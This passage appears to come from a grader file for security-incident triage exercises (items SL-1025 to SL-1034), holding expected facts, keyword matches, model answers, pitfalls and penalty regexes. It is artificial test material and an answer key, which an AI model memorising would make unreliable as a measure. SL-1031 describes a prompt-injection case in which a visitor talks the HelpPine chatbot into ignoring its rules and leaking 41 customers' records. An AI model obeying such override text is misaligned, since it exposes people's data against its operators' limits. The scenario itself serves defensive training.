    avoid: [{ pattern: "(genuine|legitimate|real)\\s+(user|reset|request|caller|a\\.menon)|a\\.menon (called|rang|phoned|requested the)", message: "a.menon is on leave and the new device sits on a hosting provider address. Treating the caller as the genuine user contradicts the evidence." }],
  },
  "SL-1025": {
    facts: [
      { label: "s.nair signed in from Pune at 09:11 and from Frankfurt at 09:15", matches: ["s.nair", "pune", "frankfurt", "09:11", "09:15"], in: "happened" },
      { label: "the rule fired for impossible travel, four minutes apart", matches: ["impossible travel", "four minutes", "4 minutes", "minutes apart"], in: "happened" },
      { label: "both sign-ins used the same managed, compliant device dev-7731 (OPS-LT-044) and browser", matches: ["dev-7731", "ops-lt-044", "same device", "managed", "compliant", "same browser"], in: "confirmed" },
      { label: "change CHG-2291 started the EdgeShield gateway pilot at 09:00", matches: ["chg-2291", "edgeshield", "gateway", "pilot", "09:00"], in: "confirmed" },
      { label: "pilot traffic leaves through Frankfurt (192.0.2.128/26)", matches: ["192.0.2.128", "192.0.2.140", "frankfurt", "egress"], in: "confirmed" },
      { label: "other Operations users show the same pattern, nobody outside the group does", matches: ["k.thomas", "a.bhatt", "d.menon", "other users", "operations", "outside the"], in: "confirmed" },
      { label: "the account did nothing unusual afterwards", matches: ["no mailbox", "no mfa", "no new", "normal", "nothing unusual", "outlook"], in: "confirmed" },
    ],
    next: [
      { label: "closing it as a false positive", matches: ["close", "false positive"] },
      { label: "saying no escalation is needed", matches: ["no escalation", "not escalat", "no need to escalat", "does not need"] },
      { label: "asking for the gateway range to be added as a known location in the rule", matches: ["known location", "add", "tune", "exclude", "named location", "allow", "range", "exception"] },
      { label: "asking IT to tell the SOC about network changes", matches: ["tell", "notify", "inform", "distribution", "soc", "communicat"] },
    ],
    model: {
      happened:
        "[[s.nair]] signed in from the Pune office at [[09:11]] and again from [[Frankfurt]] at [[09:15]], so the rule fired for impossible travel.",
      confirmed:
        "Both sign-ins came from the [[same managed, compliant device]], dev-7731 (OPS-LT-044), with the same browser, and the Wi-Fi controller still shows the laptop in Pune. Change [[CHG-2291]] started the EdgeShield gateway pilot at [[09:00]] and routes pilot traffic out through Frankfurt ([[192.0.2.128/26]]). [[k.thomas, a.bhatt and d.menon]] in Operations show the same pattern and nobody outside the group does. After 09:15 there were [[no mailbox rules, MFA changes or new devices]].",
      unknown: "I have not asked s.nair, but nothing suggests it is needed. I do not know whether the rule will fire for the remaining pilot users.",
      next: "Close as a false positive. No escalation is needed. I would ask to add [[192.0.2.128/26 as a known location]] in the impossible travel rule and ask IT to tell the SOC before network changes like this.",
    },
    pitfalls: [
      "Believing the location. Frankfurt is where the gateway is, not where the person is.",
      "Closing without evidence. The device, the change record and other users are what show it is safe.",
      "Skipping the tuning. The rule will fire for every pilot user until the range is known.",
    ],
    avoid: [{ pattern: "(is|was|looks like|appears to be|seems)\\s+(an?\\s+)?(account takeover|compromised|hijacked|stolen|attack|attacker)", message: "The same managed device and browser, the change record and the other pilot users explain the Frankfurt sign-in. Calling it an attack contradicts the evidence." }],
  },
  "SL-1026": {
    facts: [
      { label: "CallBridge updated to 18.12.4 on SALES-WS-027 at about 08:01", matches: ["callbridge", "18.12.4", "sales-ws-027", "08:01", "update"], in: "happened" },
      { label: "the update dropped vxcore2.dll, which started rundll32 and a command prompt", matches: ["vxcore2", "rundll32", "cmd.exe", "systeminfo", "whoami", "command prompt", "dll"], in: "happened" },
      { label: "the computer contacted api-voxline-cdn.test every five minutes", matches: ["api-voxline-cdn", "300 seconds", "five minutes", "5 minutes", "beacon", "every 5"], in: "happened" },
      { label: "five computers updated and show the same behaviour", matches: ["five", "5 ", "sales-ws-031", "mkt-ws-014", "exec-lt-003", "six", "other computers", "other hosts"], in: "happened" },
      { label: "the file is signed by VoxLine, but a valid signature does not make it safe", matches: ["signed", "signature", "valid"], in: "confirmed" },
      { label: "CallBridge has never started rundll32 or cmd in the last 30 days", matches: ["never started", "never run", "has never", "30 days", "last month"], in: "confirmed" },
      { label: "the supplier lists 18.12.3 as latest and has no notes for 18.12.4", matches: ["18.12.3", "no release", "supplier", "release page", "release notes", "download page"], in: "confirmed" },
      { label: "api-voxline-cdn.test is not the supplier's domain (voxline.test) and no computer had asked for it before", matches: ["voxline.test", "look-alike", "lookalike", "first time", "never seen", "not the supplier", "intel", "newly registered"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2 as critical", matches: ["escalat", "l2", "level 2"] },
      { label: "isolating the affected computers", matches: ["isolate", "contain", "disconnect", "quarantine the host", "network isolation"] },
      { label: "blocking api-voxline-cdn.test", matches: ["block"] },
      { label: "stopping the 18.12.4 update and contacting VoxLine", matches: ["update", "voxline", "supplier", "vendor", "hold", "stop"] },
      { label: "finding every host that updated or contacted the domain", matches: ["all hosts", "every", "search", "hunt", "other computers", "scope", "fin-ws-102"] },
    ],
    model: {
      happened:
        "At about 08:01 CallBridge updated to [[18.12.4]] on SALES-WS-027. The update wrote a new file, [[vxcore2.dll]], which started [[rundll32 and a command prompt running systeminfo and whoami]]. From 08:03 the computer contacted [[api-voxline-cdn.test]] every five minutes. [[Five computers]] updated and contacted the same domain.",
      confirmed:
        "The file is [[signed by VoxLine]], but a valid signature does not make it safe. In the last 30 days CallBridge has [[never started rundll32 or cmd]]. The supplier's page [[lists 18.12.3 as the latest version]] with no notes for 18.12.4, and vxcore2.dll was not in the 18.12.3 package. The domain is [[not voxline.test]], the supplier's real one, and no company computer had asked for it before. The lookup also marks it malicious.",
      unknown: "I do not know how the update was altered, whether the supplier has been breached, or what the commands sent back. FIN-WS-102 has updated but has not yet contacted the domain.",
      next: "Escalate now as critical. Please [[isolate the five affected computers]], [[block api-voxline-cdn.test]], stop the 18.12.4 update, contact VoxLine and look for any other host that updated or made the lookup, including FIN-WS-102.",
    },
    pitfalls: [
      "Trusting the signature. Attackers who break into a supplier can ship their code in a correctly signed update.",
      "Checking only the host that alerted. Several computers got the same update, so count them all.",
      "Missing the domain trick. api-voxline-cdn.test looks like the supplier's domain but is not.",
    ],
    avoid: [{ pattern: "(false positive|legitimate (update|software|vendor)|normal update|expected behaviou?r|safe because)", message: "The update added a DLL the supplier never published, started a command prompt, and contacts a look-alike domain. Calling this normal contradicts the evidence." }],
  },
  "SL-1027": {
    facts: [
      { label: "FS-02 had its shadow copies deleted (vssadmin), recovery disabled and backup catalog deleted at about 03:30", matches: ["vssadmin", "shadow", "bcdedit", "wbadmin", "03:30", "recovery", "catalog"], in: "happened" },
      { label: "lk.exe began renaming files, 3,812 so far, with the extension .h9p2k", matches: ["lk.exe", "3,812", "renamed", "renaming", "h9p2k", "encrypt", "ransom"], in: "happened" },
      { label: "a ransom note README_RESTORE.txt was created in 61 folders", matches: ["readme_restore", "ransom note", "61 folders", "note"], in: "happened" },
      { label: "the commands came from 10.20.7.88 (HR-WS-088) using PsExec and adm.rkulkarni", matches: ["10.20.7.88", "hr-ws-088", "psexec", "adm.rkulkarni"], in: "happened" },
      { label: "adm.rkulkarni logged in over the VPN at 02:48 from 203.0.113.12 with no MFA, outside their usual hours", matches: ["203.0.113.12", "vpn", "02:48", "no mfa", "usual hours", "unknown address"], in: "confirmed" },
      { label: "there is no planned work and the account owner is not on call", matches: ["no maintenance", "no planned", "no change", "not on call", "d.shah", "not booked"], in: "confirmed" },
      { label: "FS-03 was attacked at 03:32 and blocked by EDR, FS-01 is clean", matches: ["fs-03", "blocked", "fs-01", "clean"], in: "confirmed" },
      { label: "the 01:00 backup completed and is on a separate immutable store", matches: ["01:00", "backup", "immutable", "separate"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2 as critical now", matches: ["escalat", "l2", "level 2"] },
      { label: "isolating FS-02 from the network", matches: ["isolate", "disconnect", "contain", "cut off"] },
      { label: "disabling adm.rkulkarni and isolating HR-WS-088", matches: ["disable", "reset", "hr-ws-088", "adm.rkulkarni", "lock"] },
      { label: "protecting the clean 01:00 backup and checking other servers", matches: ["backup", "01:00", "fs-03", "other servers", "protect"] },
      { label: "blocking 203.0.113.12 and closing the legacy VPN profile that skips MFA", matches: ["203.0.113.12", "vpn", "block", "mfa"] },
    ],
    model: {
      happened:
        "At 03:30 someone running commands remotely on FS-02 [[deleted the shadow copies with vssadmin]], disabled recovery and deleted the backup catalog. From 03:31 an unsigned program, [[lk.exe]], began [[renaming files]] (3,812 so far) in the Finance share and created a [[ransom note, README_RESTORE.txt]], in 61 folders. The commands came from [[10.20.7.88 (HR-WS-088)]] with the account [[adm.rkulkarni]] using PsExec.",
      confirmed:
        "adm.rkulkarni logged in over the VPN at 02:48 from [[203.0.113.12]], an address never seen for the account, with [[no MFA]] and well outside the usual hours. There is [[no maintenance booked]] for FS-02 and the account owner is not on call. [[FS-03]] was attacked at 03:32 and blocked by EDR, and [[FS-01 is clean]]. The [[01:00 backup]] completed and sits on a separate immutable store.",
      unknown: "I do not know how the attacker got adm.rkulkarni's password, how many files are already encrypted, or whether data was copied out before the encryption. I have not checked other servers outside FS-01 to FS-03.",
      next: "Escalate now as critical. Please [[isolate FS-02]] from the network, [[disable adm.rkulkarni]] and isolate HR-WS-088, protect the 01:00 backup, check the other servers, and block 203.0.113.12 and the old VPN profile that skips MFA.",
    },
    pitfalls: [
      "Waiting to understand everything. Renaming is happening at 15 files per second, so contain first.",
      "Thinking backups mean there is nothing to do. Ransomware groups often copy data out before encrypting.",
      "Looking only at FS-02. The commands came from HR-WS-088 with a domain admin account, so the account and that workstation are part of the incident.",
    ],
    avoid: [{ pattern: "(planned|maintenance|scheduled|legitimate|admin work|false positive)", message: "There is no change or maintenance booked, the VPN login came from an unknown address at 02:48 and an unsigned program is renaming files. Calling it planned work contradicts the evidence." }],
  },
  "SL-1028": {
    facts: [
      { label: "the key ending 7Q3M (svc-deploy-ci) was used from 203.0.113.99", matches: ["7q3m", "svc-deploy-ci", "203.0.113.99", "deploy key", "access key"], in: "happened" },
      { label: "the key was used in eu-north-1, a region the company does not use", matches: ["eu-north-1", "new region", "region", "never used"], in: "happened" },
      { label: "eight g5.12xlarge GPU servers were started at 11:04", matches: ["eight", "8 ", "g5.12xlarge", "gpu", "11:04", "runinstances", "servers"], in: "happened" },
      { label: "a new admin user backup-ops2 and key were created", matches: ["backup-ops2", "administratoraccess", "admin user", "new user", "createaccesskey", "new key"], in: "happened" },
      { label: "normally the key is used only from 192.0.2.10 and in ap-south-1", matches: ["192.0.2.10", "ap-south-1", "normally", "baseline", "only from"], in: "confirmed" },
      { label: "the key was committed in deploy.env and the repository was made public at 09:40", matches: ["public", "09:40", "deploy.env", "7c1d2e", "d.mehra", "repository", "committed"], in: "confirmed" },
      { label: "the secret scanning alert at 09:43 was not looked at", matches: ["09:43", "secret scanning", "not looked", "untriaged", "not triaged", "not yet looked"], in: "confirmed" },
      { label: "the servers download a program and connect to a mining pool, costing about 1,900 dollars a day", matches: ["miner", "mining", "198.51.100.230", "1,900", "port 4444", "cost"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2", matches: ["escalat", "l2", "level 2"] },
      { label: "revoking the key ending 7Q3M and the new backup-ops2 key and user", matches: ["revoke", "disable", "deactivate", "delete", "backup-ops2", "rotate"] },
      { label: "terminating the eight servers", matches: ["terminate", "stop the", "shut down", "instances", "servers"] },
      { label: "making the repository private and removing the key from its history", matches: ["private", "history", "remove", "repository", "repo"] },
      { label: "checking everything else created by the key", matches: ["review", "check", "other resources", "audit", "anything else", "cloudtrail", "audit log"] },
    ],
    model: {
      happened:
        "At 11:02 the access key [[ending 7Q3M]], which belongs to [[svc-deploy-ci]], was used from [[203.0.113.99]] in [[eu-north-1]], a region we do not use. At 11:04 it started [[eight g5.12xlarge GPU servers]]. At 11:05 it created a new administrator user, [[backup-ops2]], and a key for it.",
      confirmed:
        "The audit log shows that in the last 30 days the key was used [[only from 192.0.2.10 and only in ap-south-1]]. The repository records show the key was committed in deploy.env in March, and the repository was [[made public at 09:40]]. The [[secret scanning alert at 09:43]] had not been looked at. The servers download a program from 198.51.100.230 and connect to a [[mining pool]], costing about [[1,900 dollars a day]].",
      unknown: "I do not know whether other resources were created, whether the new user has been used yet, or whether the repository held other secrets that were copied. I have not checked the audit log for other regions.",
      next: "Escalate now. Please [[revoke the 7Q3M key and the backup-ops2 user and key]], [[terminate the eight servers]], make the repository private and remove the key from its history, and check the audit log for anything else the key created.",
    },
    pitfalls: [
      "Revoking only the key from the alert. The new admin user and key let the attacker back in.",
      "Looking at cost only. The instances are the loud part, but the new admin user is the dangerous part.",
      "Skipping the cause. Making the repository private does not remove the key from its history, so the key has to be rotated.",
    ],
    avoid: [{ pattern: "(pipeline|ci|deployment|team|developer)\\s+(started|launched|created|ran)\\s+(the|these|them)|(legitimate|expected|normal use|false positive)", message: "The key is normally used only from 192.0.2.10 in ap-south-1, and nobody on the team created these servers. Calling this the pipeline or a normal use contradicts the evidence." }],
  },
  "SL-1029": {
    facts: [
      { label: "p.rao approved the app DocuViewer Pro at 10:21", matches: ["p.rao", "docuviewer", "10:21", "approved", "consent", "granted"], in: "happened" },
      { label: "the app can read and send mail, read files and keep access offline", matches: ["mail", "files", "offline", "permission", "read and send"], in: "happened" },
      { label: "it read about 2,140 emails and searched for invoice, wire and bank details", matches: ["2,140", "2,100", "invoice", "wire", "bank details", "read"], in: "happened" },
      { label: "it sent 12 emails to p.rao's contacts with the same link", matches: ["12", "sent", "contacts", "same link", "send mail"], in: "happened" },
      { label: "the app is unverified, three days old and registered in pixelgrove.test", matches: ["unverified", "not verified", "3 days", "three days", "pixelgrove", "publisher"], in: "confirmed" },
      { label: "no password or MFA was stolen: p.rao's sign-ins are normal", matches: ["no password", "mfa passed", "no other sign-in", "no new device", "not stolen", "not a password", "password theft"], in: "confirmed" },
      { label: "the link came from a supplier's mailbox and went to the genuine Microsoft sign-in page", matches: ["northwind", "supplier", "m.shah", "genuine", "microsoft", "real sign-in"], in: "confirmed" },
      { label: "k.bhat and m.das also approved the app", matches: ["k.bhat", "m.das", "two other", "other users", "also approved"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2", matches: ["escalat", "l2", "level 2"] },
      { label: "removing the app's consent for all three users and revoking its tokens", matches: ["revoke", "remove", "consent", "token", "block the app", "disable the app", "delete the app"] },
      { label: "reviewing and recalling the emails the app sent", matches: ["sent", "recall", "purge", "12 messages", "emails the app", "delete"] },
      { label: "warning Northwind Freight and the staff who got the link", matches: ["northwind", "warn", "tell", "notify", "contact", "supplier"] },
      { label: "blocking user consent to unverified apps", matches: ["policy", "unverified", "user consent", "restrict", "admin approval"] },
    ],
    model: {
      happened:
        "At 10:21 [[p.rao]] approved an app called [[DocuViewer Pro]] after clicking a link in an email at 10:19. The app can read and send mail, read files and keep access without signing in. From 10:23 it [[read about 2,140 emails]], searched for [[invoice, wire and bank details]], and at 10:40 sent [[12 emails]] to p.rao's contacts with the same link.",
      confirmed:
        "The app is [[unverified]], was registered three days ago in [[pixelgrove.test]] and is open to any organisation. p.rao's sign-ins are [[normal with MFA passed]] and show [[no password theft]]. The link came from a supplier's mailbox (Northwind Freight) and led to the genuine Microsoft sign-in page, so the web proxy saw nothing wrong. [[k.bhat and m.das]] also approved the app.",
      unknown: "I do not know whether the supplier's mailbox is compromised, which of the 2,140 emails were sensitive, or whether the 12 sent emails reached people who also approved the app.",
      next: "Escalate now. Please [[remove the app's consent for p.rao, k.bhat and m.das and revoke its tokens]], recall the 12 emails it sent, warn Northwind Freight and recipients, and restrict user consent to unverified apps.",
    },
    pitfalls: [
      "Looking for a stolen password. The sign-in log is normal, because the user signed in correctly and then approved the app.",
      "Trusting the link because it was a Microsoft page. The page was genuine, but the permissions it asked for belonged to the attacker's app.",
      "Resetting the password and stopping. The app's token keeps working until the consent is removed.",
    ],
    avoid: [{ pattern: "(password|credentials)[^.]{0,25}(was|were|has been|have been)\\s+(stolen|phished|compromised|taken)|(false positive|legitimate app|safe app)", message: "No password or MFA was stolen and the app is unverified and reading mail. Saying the password was phished, or that the app is legitimate, contradicts the evidence." }],
  },
  "SL-1030": {
    facts: [
      { label: "LEG-WS-012 made 9,214 DNS queries in an hour with long names", matches: ["leg-ws-012", "9,214", "dns", "long", "queries"], in: "happened" },
      { label: "every query went to lookup.shieldsense-cloud.test", matches: ["shieldsense-cloud", "lookup.", "same domain", "txt"], in: "happened" },
      { label: "the queries came from ShieldSenseSvc.exe, signed by ShieldSense Inc.", matches: ["shieldsensesvc", "shieldsense", "signed", "valid", "service", "agent"], in: "confirmed" },
      { label: "the domain is in the vendor's release note and v7.4 was approved under CHG-2287", matches: ["chg-2287", "release note", "documented", "approved", "approved software", "vendor"], in: "confirmed" },
      { label: "the queries started with the 13:00 scheduled full-disk scan", matches: ["13:00", "13:02", "scan", "scheduled"], in: "confirmed" },
      { label: "38 other laptops show the same pattern", matches: ["38", "other laptops", "fleet", "same pattern", "in proportion"], in: "confirmed" },
      { label: "nothing else left the laptop: no other process, no large upload", matches: ["no other process", "no large", "no upload", "nothing else", "no new outbound", "no scripting"], in: "confirmed" },
    ],
    next: [
      { label: "closing it as a false positive", matches: ["close", "false positive"] },
      { label: "saying no escalation is needed", matches: ["no escalation", "not escalat", "no need to escalat", "does not need"] },
      { label: "excluding this agent and domain from the rule", matches: ["exclude", "exception", "allow", "tune", "whitelist", "allowlist", "exempt", "narrow"] },
      { label: "keeping the rule on for other processes and domains", matches: ["other process", "other domain", "keep", "still", "everything else"] },
    ],
    model: {
      happened:
        "[[LEG-WS-012]] made [[9,214 DNS queries]] in an hour with long, random-looking names. All of them were TXT queries to [[lookup.shieldsense-cloud.test]], and the answers were 110 to 130 bytes.",
      confirmed:
        "Every query came from [[ShieldSenseSvc.exe]], the company's endpoint security agent, which is [[signed by ShieldSense Inc.]] and has [[no other process]] making the lookups. The domain is in the vendor's [[release note]] and v7.4 was approved under [[CHG-2287]]. The queries began at [[13:02]], just after the weekly [[full-disk scan]] started at 13:00, and stopped when it finished. [[38 other laptops]] show the same pattern, scaled by the number of files scanned. There was no large upload or new outbound connection.",
      unknown: "I have not asked n.joshi, but nothing suggests it is needed. I do not know how the rule will behave on the remaining laptops that scan later.",
      next: "Close as a false positive. No escalation is needed. I would ask to [[exclude the ShieldSense agent and its lookup domain]] from the rule and keep it on for every other process and domain.",
    },
    pitfalls: [
      "Calling every long DNS name a tunnel. Check which process makes them, the domain, and whether other laptops do the same.",
      "Judging by the volume alone. A real tunnel usually comes from an unexpected process, to a new domain, and moves data out.",
      "Fixing it by switching the rule off. Narrow the exception to this agent and this domain.",
    ],
    avoid: [{ pattern: "(is|was|looks like|appears to be|seems)\\s+(an?\\s+)?(dns tunnel|tunnelling|tunneling|exfiltrat|data theft|malware|attack)", message: "The signed company security agent made the queries to its documented domain during its scheduled scan, and other laptops do the same. Calling it tunnelling or exfiltration contradicts the evidence." }],
  },
  "SL-1031": {
    facts: [
      { label: "a visitor in session 88213 told HelpPine to ignore its rules and enter 'maintenance mode'", matches: ["ignore", "maintenance mode", "88213", "told the bot", "instructions", "prompt injection"], in: "happened" },
      { label: "the bot looked up and printed records for 41 accounts, 112 shipments, in about five minutes", matches: ["41", "112", "five minutes", "5 minutes", "lookup_shipments", "printed", "returned"], in: "happened" },
      { label: "the lookup tool can read every customer account and the API does not check who is signed in", matches: ["every customer", "every account", "all accounts", "does not check", "no check", "service account", "permission"], in: "confirmed" },
      { label: "the only limit was a written rule in the bot's instructions, which the visitor talked it out of", matches: ["written rule", "only rule", "only limit", "in the prompt", "no limit", "no check in the code", "instructions say"], in: "confirmed" },
      { label: "the visitor's own account HP-9034 is two days old, has no shipments and was never looked up", matches: ["hp-9034", "two days", "2 days", "no shipments", "free email", "own account"], in: "confirmed" },
      { label: "the same hosting-provider address tried to make the bot reveal its instructions in three sessions yesterday", matches: ["yesterday", "three sessions", "3 sessions", "show your instructions", "hosting", "198.51.100.231", "earlier sessions"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2", matches: ["escalat", "l2", "level 2"] },
      { label: "switching off or restricting the lookup tool until it is fixed", matches: ["disable", "turn off", "switch off", "take offline", "suspend", "pause", "restrict", "remove the tool"] },
      { label: "blocking the address and the visitor's account", matches: ["block", "198.51.100.231", "hp-9034", "suspend the account", "disable the account"] },
      { label: "working out which 41 customers were exposed and telling the privacy team", matches: ["41", "customers", "privacy", "data protection", "notify", "legal", "affected"] },
      { label: "making the API check which customer is signed in", matches: ["check", "scope", "signed-in", "signed in", "least privilege", "per customer", "fix", "api"] },
    ],
    model: {
      happened:
        "At [[14:59]] in session [[88213]], a visitor at [[198.51.100.231]] [[told the bot to ignore its rules]] and enter [[maintenance mode]]. HelpPine then [[looked up and printed records for 41 accounts]], [[112 shipments]] with names and delivery addresses, in about [[five minutes]].",
      confirmed:
        "The lookup tool [[can read every customer account]] and the API [[does not check who is signed in]]. The [[only limit was a written rule]] in the bot's instructions, which the visitor talked it out of. The visitor's own account, [[HP-9034]], is [[two days old]], has no shipments and was never looked up. The same hosting-provider address tried to make the bot [[show its instructions]] in [[three sessions yesterday]].",
      unknown: "I do not know whether the visitor saved the records, whether the same address has tried other chatbots, or which of the 41 customers hold sensitive contracts.",
      next: "Escalate now. Please [[switch off or restrict lookup_shipments]] until the API checks which customer is signed in, [[block 198.51.100.231 and account HP-9034]], identify the [[41 customers]] and tell the privacy team, and add a limit on lookups per session.",
    },
    pitfalls: [
      "Trusting the rule in the prompt. A written instruction to the bot is a request, not a lock. The access has to be limited in code.",
      "Treating the bot as the attacker. The bot did what the visitor typed. The fault is that its tool could read every account.",
      "Looking only at the chat. The backend API log is what shows how many accounts were really returned.",
    ],
    avoid: [{ pattern: "(false positive|normal (use|behaviou?r|session|customer)|working as designed|safe because|expected behaviou?r)", message: "The visitor made the bot ignore its rules and it returned 41 other customers' records. Calling this normal or expected contradicts the evidence." }],
  },
  "SL-1032": {
    facts: [
      { label: "r.deshmukh got a call at 14:02 from a number showing the CFO's name, asking for an urgent confidential payment", matches: ["14:02", "call", "r.deshmukh", "caller id", "urgent", "confidential", "cfo", "voice"], in: "happened" },
      { label: "an email from harborpine-pay.test followed at 14:10 with invoice HP-INV-7731 and new bank details", matches: ["14:10", "harborpine-pay", "hp-inv-7731", "invoice", "bank details", "email"], in: "happened" },
      { label: "payment request PR-30417 for $186,400 to a new beneficiary, Eastbridge, was created at 14:21 and is waiting for second approval", matches: ["pr-30417", "186,400", "eastbridge", "14:21", "second approval", "m.iyer", "beneficiary"], in: "happened" },
      { label: "the CFO was in a board meeting, and the assistant confirmed no payment was requested", matches: ["board meeting", "do-not-disturb", "assistant", "c.rivera", "no payment", "confirmed"], in: "confirmed" },
      { label: "the call came from an external number, not the CFO's extension 4107", matches: ["external", "4107", "555 0188", "outside number", "not the company", "extension"], in: "confirmed" },
      { label: "harborpine-pay.test was registered 5 days ago and imitates the company domain", matches: ["five days", "5 days", "harborpine-pay", "look-alike", "lookalike", "registered", "imitates"], in: "confirmed" },
      { label: "Eastbridge is not an approved supplier, and two other finance staff got calls from the same number", matches: ["approved supplier", "not on the list", "no supplier", "different bank", "eastbridge", "two other", "same number", "other finance"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2 as critical", matches: ["escalat", "l2", "level 2"] },
      { label: "stopping payment PR-30417 and telling the second approver not to approve it", matches: ["stop", "hold", "cancel", "do not approve", "not approve", "block the payment", "m.iyer", "pr-30417", "recall"] },
      { label: "confirming with the CFO or the assistant through a number we already trust", matches: ["call back", "known number", "trusted", "confirm", "verify", "assistant", "4107", "second channel"] },
      { label: "blocking harborpine-pay.test and searching for other emails from it", matches: ["block", "harborpine-pay", "search", "other emails", "remove", "mail"] },
      { label: "warning finance staff and keeping the call record", matches: ["warn", "tell", "notify", "finance team", "awareness", "preserve", "call record", "keep"] },
    ],
    model: {
      happened:
        "At [[14:02]] r.deshmukh got a call whose caller ID showed the CFO's name, asking for an [[urgent, confidential payment]]. At [[14:10]] an email arrived from [[harborpine-pay.test]] with invoice [[HP-INV-7731]] and [[new bank details]]. At 14:21 r.deshmukh created payment request [[PR-30417 for $186,400]] to a new beneficiary, Eastbridge, which is [[waiting for second approval]].",
      confirmed:
        "The CFO's [[calendar shows a board meeting]] and the CFO's [[assistant confirmed no payment was requested]]. The call came on an [[external line, not extension 4107]]. harborpine-pay.test was [[registered five days ago]] and imitates our domain. [[Eastbridge is not an approved supplier]] and [[two other finance staff]] got calls from the same number this week.",
      unknown: "I do not know whether the voice was a recording, an imitation or a computer-made copy, but it does not change what we must do. I do not know who else has been targeted beyond the three staff.",
      next: "Escalate now as critical. Please [[stop payment PR-30417]] and tell the second approver not to approve it before the 16:00 bank release, confirm with the CFO through a trusted number, [[block harborpine-pay.test]] and search for other emails from it, and warn finance staff.",
    },
    pitfalls: [
      "Trusting the voice. A voice that sounds exactly right is not proof of who is speaking.",
      "Waiting for more proof. The payment can still be released at 16:00, so time is the main risk.",
      "Calling the number in the email or on the caller ID. Always confirm using a number you already trust.",
    ],
    avoid: [{ pattern: "(false positive|(is|was|looks|seems|appears)\\s+(like\\s+)?(a\\s+)?(genuine|legitimate|real)\\s+(request|call|payment|invoice))", message: "The call came from an outside number while the CFO was in a board meeting and asked for no payment. Calling the request genuine contradicts the evidence." }],
  },
  "SL-1033": {
    facts: [
      { label: "an email about invoice HP-5532 reached 40 staff and three people clicked the link", matches: ["hp-5532", "40", "three", "3 clicked", "clicked", "invoice"], in: "happened" },
      { label: "d.kamath submitted a password on the fake sign-in page at 11:09", matches: ["d.kamath", "11:09", "post", "submitted", "typed", "entered", "password"], in: "happened" },
      { label: "someone signed in as d.kamath from 203.0.113.118 at 11:24, created a hiding rule and emailed six vendors about bank details", matches: ["203.0.113.118", "11:24", "amsterdam", "rule", "hid", "six", "6 emails", "vendors", "bank details"], in: "happened" },
      { label: "the email passed SPF, DKIM and DMARC, so the checks do not prove it is safe", matches: ["spf", "dkim", "dmarc", "checks pass", "passed"], in: "confirmed" },
      { label: "brightwell-ledger.test was registered 6 days ago and the link leads to a fake Microsoft sign-in page", matches: ["6 days", "six days", "registered", "new domain", "fake", "docs-brightwell", "look-alike", "sign-in page"], in: "confirmed" },
      { label: "the sign-in reused a session token, so MFA did not stop it", matches: ["token", "session", "reused", "mfa", "already satisfied", "adversary"], in: "confirmed" },
      { label: "n.dsouza and t.pillai clicked but did not type a password", matches: ["n.dsouza", "t.pillai", "did not type", "no post", "only clicked", "did not submit"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2", matches: ["escalat", "l2", "level 2"] },
      { label: "resetting d.kamath's password and revoking their sessions", matches: ["reset", "revoke", "sessions", "sign out", "disable", "password"] },
      { label: "removing the mailbox rule and recalling the six emails sent to vendors", matches: ["rule", "recall", "vendors", "six", "6 emails", "warn the vendors", "bank details"] },
      { label: "blocking the domains and removing the email from the other mailboxes", matches: ["block", "brightwell-ledger", "remove", "delete", "purge", "other mailboxes", "37"] },
      { label: "checking n.dsouza and t.pillai and warning staff", matches: ["n.dsouza", "t.pillai", "check", "warn", "awareness", "tell staff"] },
    ],
    model: {
      happened:
        "An email about [[invoice HP-5532]] reached [[40 staff]] and [[three people clicked]]. [[d.kamath]] submitted a password on the fake sign-in page at [[11:09]]. At [[11:24]] someone signed in as d.kamath from [[203.0.113.118]], created a [[mailbox rule]] that hides invoice and payment emails and sent [[six emails to vendors]] asking for new bank details.",
      confirmed:
        "The mail gateway record shows the email [[passed SPF, DKIM and DMARC]], so those checks do not prove it is safe. [[brightwell-ledger.test was registered 6 days ago]] and the link leads to a [[fake Microsoft sign-in page]]. The 11:24 sign-in [[reused a session token]], so MFA did not stop it. [[n.dsouza and t.pillai]] clicked but [[did not type a password]].",
      unknown: "I do not know what the attacker read in d.kamath's mailbox, whether any vendor has already answered, or whether the other 29 people who opened the email have clicked since.",
      next: "Escalate now. Please [[reset d.kamath's password and revoke their sessions]], remove the mailbox rule, [[recall the six emails and warn the vendors]], [[block both domains]], remove the email from the other 37 mailboxes and check n.dsouza and t.pillai.",
    },
    pitfalls: [
      "Judging the email by its writing. AI makes perfect, personalised text, so spelling and tone no longer help. Check the domain age, the link and what happened after the click.",
      "Trusting passing email checks. They prove the sender controls its domain, not that the sender is honest.",
      "Stopping at the password reset. The attacker's rule and six sent emails keep working until they are removed.",
    ],
    avoid: [{ pattern: "(false positive|(email|message)\\s+(is|was)\\s+(safe|legitimate|genuine)|safe because (it|the)|passed (the )?checks?,? (so|therefore) (it|the email) (is|was) (safe|legitimate))", message: "The email passed SPF, DKIM and DMARC, but the domain is six days old, the link goes to a fake sign-in page and an account was taken over. Calling it safe contradicts the evidence." }],
  },
  "SL-1034": {
    facts: [
      { label: "s.rajan uploaded customer-churn-q3.csv (1,900 rows, Confidential) to harborpine.lumen-workspace.test at 12:14", matches: ["s.rajan", "customer-churn-q3", "1,900", "confidential", "12:14", "upload"], in: "happened" },
      { label: "the rule fired because the destination is in the generative AI category", matches: ["ai category", "generative ai", "ai service", "rule fired", "category", "ai tool"], in: "happened" },
      { label: "the destination is the company's own tenant of Lumen Workspace Enterprise, an approved tool allowed up to Confidential", matches: ["approved", "ai-app-006", "own tenant", "company tenant", "company's own", "up to confidential", "register"], in: "confirmed" },
      { label: "s.rajan signed in with company single sign-on and MFA from a managed laptop, with no visits to personal AI sites", matches: ["single sign-on", "sso", "mfa", "managed", "cs-lt-019", "personal ai", "no visits"], in: "confirmed" },
      { label: "ticket CS-2210 and the manager explain the work", matches: ["cs-2210", "ticket", "churn analysis", "manager", "head of customer success"], in: "confirmed" },
      { label: "14 licensed users uploaded 17 files this week", matches: ["14", "17", "licensed", "same tenant", "other users", "this week"], in: "confirmed" },
    ],
    next: [
      { label: "closing it as a false positive", matches: ["close", "false positive"] },
      { label: "saying no escalation is needed", matches: ["no escalation", "not escalat", "no need to escalat", "does not need"] },
